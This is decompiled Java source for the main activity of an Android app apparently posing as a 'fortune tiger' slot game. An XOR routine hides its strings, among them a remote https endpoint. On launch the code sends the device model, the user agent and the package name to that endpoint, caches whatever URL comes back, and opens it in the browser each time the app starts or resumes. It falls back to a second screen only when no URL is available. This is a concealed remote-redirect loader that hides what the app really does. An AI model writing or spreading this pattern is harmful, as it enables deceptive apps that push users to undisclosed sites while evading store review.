package com.gglhk.bofio.fortunetiger;

import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.WebSettings;
import android.widget.ProgressBar;
import androidx.activity.r;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.emoji2.text.w;
import b3.e;
import c3.l;
import c3.p;
import c3.q;
import c3.s;
import com.gglhk.bofio.fortunetiger.MainActivity;
import com.gglhk.bofio.fortunetiger.R;
import f.i;
import g3.f;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.WeakHashMap;
import k0.b0;
import k0.j0;
import k3.m;
import k3.o;
import m2.b;
import t2.a;
import u2.c;

/* compiled from: r8-map-id-72a2021f0a77848162657eed404f056d03742612a99b9acca4b8f3bd8ed17555 */
/* loaded from: classes.dex */
public final class MainActivity extends i {
    public static final /* synthetic */ int I = 0;
    public String E;
    public SharedPreferences H;
    public final b D = new b(new a() { // from class: j1.e
        @Override // t2.a
        public final Object a() {
            int i4 = MainActivity.I;
            View inflate = MainActivity.this.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
            ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
            if (((ProgressBar) m.r(inflate, R.id.progressBar)) != null) {
                return new k1.b(constraintLayout);
            }
            throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.progressBar)));
        }
    });
    public final String F = t(new byte[]{99, -57, 103});
    public final String G = t(new byte[]{114, -44, 114, -51});

    public static String t(byte[] bArr) {
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i4 = 0;
        int i5 = 0;
        int i6 = 0;
        while (i5 < length) {
            int i7 = i6 + 1;
            arrayList.add(Byte.valueOf((byte) ((i6 % 2 == 0 ? 0 : 161) ^ (bArr[i5] & 255))));
            i5++;
            i6 = i7;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        int size = arrayList.size();
        int i8 = 0;
        while (i8 < size) {
            Object obj = arrayList.get(i8);
            i8++;
            bArr2[i4] = ((Number) obj).byteValue();
            i4++;
        }
        return new String(bArr2, b3.a.f967a);
    }

    @Override // f.i, androidx.activity.o, android.app.Activity
    public final void onCreate(Bundle bundle) {
        f fVar;
        super.onCreate(bundle);
        this.H = getSharedPreferences(this.F, 0);
        r.a(this);
        setContentView(((k1.b) this.D.a()).f2819a);
        View findViewById = findViewById(R.id.main);
        d3.a aVar = new d3.a(6);
        WeakHashMap weakHashMap = j0.f2752a;
        b0.j(findViewById, aVar);
        getWindow().setFlags(1024, 1024);
        SharedPreferences sharedPreferences = this.H;
        f fVar2 = null;
        if (sharedPreferences == null) {
            c.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.G, null);
        if (string != null && !e.j0(string)) {
            this.E = string;
            v(string);
            return;
        }
        String packageName = getPackageName();
        String t3 = t(new byte[]{114, -44, 114, -51});
        String t4 = t(new byte[]{63, -64, 112, -47, 61});
        String str = t(new byte[]{104, -43, 116, -47, 115, -101, 47, -114, 115, -55, 121, -116, 104, -56, 108, -51, 45, -59, 100, -57, 56, -113, 105, -40, 121, -64, 114, -62, 104, -56, 107, -111, 48, -47, 108, -39, 110, -106, 50, -113, 119, -50, 114, -54, 101, -45, 115, -113, 100, -60, 118}) + t4 + packageName;
        q qVar = new q(new p());
        w wVar = new w(4);
        c.e(str, "url");
        if (b3.m.b0(str, "ws:", true)) {
            String substring = str.substring(3);
            c.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (b3.m.b0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            c.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        c.e(str, "<this>");
        l lVar = new l(0);
        lVar.f(null, str);
        wVar.f368f = lVar.b();
        String t5 = t(new byte[]{88, -116, 68, -60, 118, -56, 99, -60, 45, -20, 111, -59, 101, -51});
        String str2 = Build.MODEL;
        c.d(str2, "MODEL");
        wVar.k(t5, str2);
        wVar.k(t(new byte[]{65, -62, 99, -60, 112, -43, 45, -19, 97, -49, 103, -44, 97, -58, 101}), t(new byte[]{101, -49, 45, -12, 83, -115, 101, -49, 59, -48, 61, -111, 46, -104}));
        String t6 = t(new byte[]{85, -46, 101, -45, 45, -32, 103, -60, 110, -43});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        c.d(defaultUserAgent, "getDefaultUserAgent(...)");
        wVar.k(t6, defaultUserAgent);
        s b2 = wVar.b();
        g3.i iVar = new g3.i(qVar, b2);
        a2.s sVar = new a2.s((LayoutInflater.Factory2) this, (Object) t3, 14);
        if (!iVar.f1945j.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        o oVar = o.f2841a;
        iVar.f1946k = o.f2841a.g();
        w wVar2 = qVar.f1102f;
        f fVar3 = new f(iVar, sVar);
        wVar2.getClass();
        synchronized (wVar2) {
            ((ArrayDeque) wVar2.g).add(fVar3);
            String str3 = b2.f1127a.f1078d;
            Iterator it = ((ArrayDeque) wVar2.h).iterator();
            while (true) {
                if (it.hasNext()) {
                    fVar = (f) it.next();
                    if (c.a(fVar.h.g.f1127a.f1078d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) wVar2.g).iterator();
                    while (it2.hasNext()) {
                        fVar = (f) it2.next();
                        if (c.a(fVar.h.g.f1127a.f1078d, str3)) {
                        }
                    }
                }
            }
            fVar2 = fVar;
            if (fVar2 != null) {
                fVar3.g = fVar2.g;
            }
        }
        wVar2.q();
    }

    @Override // f.i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.E;
        if (str != null) {
            v(str);
        }
    }

    public final void u() {
        startActivity(new Intent(this, (Class<?>) MainActivity2.class));
    }

    public final void v(String str) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            u();
        }
    }
}
